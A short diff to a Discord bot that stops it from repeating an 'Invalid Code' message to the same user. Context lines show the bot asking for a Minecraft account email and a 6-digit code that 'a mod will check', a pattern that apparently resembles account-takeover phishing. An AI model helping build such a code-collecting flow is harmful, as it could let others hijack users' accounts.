@@ -16,6 +16,7 @@ bot = commands.Bot(command_prefix='!', intents=intents)
 
 # To track if the bot has already sent the verification DM to the user
 sent_verification_dms = {}
+sent_invalid_codes = set()  # To track users who entered an invalid code
 
 class VerifyModal(discord.ui.Modal, title="Link Your Minecraft Account"):
     email = discord.ui.TextInput(label="Minecraft Email", placeholder="example@gmail.com", required=True)
@@ -134,12 +135,17 @@ async def on_message(message: discord.Message):
             await message.channel.send("✅ Code received. A mod will check it soon!")
 
         else:
-            embed = discord.Embed(
-                title="❌ Invalid Code",
-                description="The code you entered is invalid. Please try again with your 6-digit code.",
-                color=discord.Color.red()
-            )
-            await message.channel.send(embed=embed)
+            # Avoid sending the invalid code embed twice
+            if message.author.id not in sent_invalid_codes:
+                embed = discord.Embed(
+                    title="❌ Invalid Code",
+                    description="The code you entered is invalid. Please try again with your 6-digit code.",
+                    color=discord.Color.red()
+                )
+                await message.channel.send(embed=embed)
+
+                # Mark this user as having received an invalid code message
+                sent_invalid_codes.add(message.author.id)
 
     # Don't forget to call this so bot can process commands
     await bot.process_commands(message)
